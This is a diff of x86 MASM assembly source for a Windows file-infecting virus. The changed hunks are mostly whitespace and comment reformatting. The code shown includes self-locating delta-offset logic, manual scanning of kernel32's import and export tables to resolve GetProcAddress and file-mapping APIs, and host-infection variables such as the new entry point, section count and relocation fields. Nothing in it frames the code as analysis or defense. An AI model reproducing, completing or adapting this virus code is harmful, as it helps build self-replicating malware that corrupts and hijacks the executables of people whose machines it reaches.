@@ -1,27 +1,24 @@
 .586
 .model flat,stdcall
 option casemap:none
-
    include windows.inc
    include user32.inc
    include kernel32.inc
    include masm32.inc
    include masm32rt.inc
-   
    includelib user32.lib
    includelib kernel32.lib
    includelib masm32.lib
-   
 .data
 FindFirstFileError              		BYTE                        "FindFirstFile failed ", 0
 FindFirstFileSuccess            		BYTE                        "First file found with success ", 0
 FindNextFileError               		BYTE                        "FindNextFile failed ", 0
 FindNextFileSuccess             		BYTE                        "FirstNextFile found with success ", 0
 FolderFound           		  		BYTE                        "Folder found", 0
-PATH							db				    "C:\Documents and Settings\Administrator\Desktop\virus\",0
+PATH					        db			    "C:\Documents and Settings\Administrator\Desktop\virus\",0
 virus_size equ (virus_end-virusCode)
 .code
-; -----------------------------------;
+; ------------------------------------------------------------------------------------------------------------------;
 virusCode:
 	pushad
 	pushfd
@@ -33,9 +30,9 @@ delta:
 	sub eax,offset delta - offset virusCode
 	sub eax,00001000h
 	mov [ebp+image_base],eax			; save image base
-;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
-;------------Find import section-------------;
-;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;--------------------------------------------Find import section---------------------------------------------------;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
 
 	mov esi,[image_base+ebp]			; point on image base
 	add eax,3ch						; At offset 3ch is the dword 'header relocation'.This value here= offset begin (PE header)  
@@ -46,9 +43,9 @@ delta:
 	add eax,esi						; now point to import table (+ image_base)
 	add eax,12						; +CH (point to .dll)   
 	
-;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
-;------------Scan import-------------;
-;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;	
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;-----------------------------------------------Scan import---------------------------------------------------------;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;	
 find_kernel32:
 	xor ebx,ebx						; reset ebx
 	cmp dword ptr[eax],ebx				; cmp if value tai eax=0
@@ -89,9 +86,9 @@ find_MZ_in_kernel:
 	add esi,120						; move to export table
 	mov esi,[esi]					; get value
 	add esi,edi						; +image_base->esi point to the export table !!!
-;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
-;------------Get Win API-------------;
-;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;		
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;----------------------------------------------Get Win API---------------------------------------------------------;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;		
 find_API:
 	push ebp
 	call find_ProcAddress						; Find address of func GetProcAddress
@@ -529,18 +526,18 @@ delta_var    				dd    0h
 map_handle    				dd    0h
 file_map_handle    			dd    0h
 mem_map_handle    			dd    0h
-host_opt_size    				dw    0h
-host_no_sect    				dw    0h
-host_file_alig   				dd    0h
-host_sec_alig    				dd    0h
-host_relc_raw    				dd    0h
+host_opt_size    			dw    0h
+host_no_sect    			dw    0h
+host_file_alig   			dd    0h
+host_sec_alig    			dd    0h
+host_relc_raw    			dd    0h
 virtual_out    				dd    0h
-search_handle    				dd    0h
-host_rel_tab    				dd    0h
+search_handle    			dd    0h
+host_rel_tab    			dd    0h
 host_new_entry    			dd    0h    
 
 Win32FindData struct
-	FileAttributes           	dd 0              ;attributes
+      FileAttributes           	dd 0              ;attributes
       CreationTime             	dd 0,0            ;time of creation
       LastAccessTime           	dd 0,0            ;last access time
       LastWriteTime            	dd 0,0            ;last modification
@@ -563,7 +560,7 @@ APIName:
 	UnmapViewOfFileStr    		db    "UnmapViewOfFile", 0 
 	CloseHandleStr        		db    "CloseHandle", 0 
 	VirtualProtectStr    		db    "VirtualProtect", 0
-	SetCurrentDirectoryStr		db	"SetCurrentDirectoryA", 0
+	SetCurrentDirectoryStr		db    "SetCurrentDirectoryA", 0
 APIAddress:
 	FindNextFileAAddress    	 	dd    0h
 	FindFirstFileAAddress   	 	dd    0h
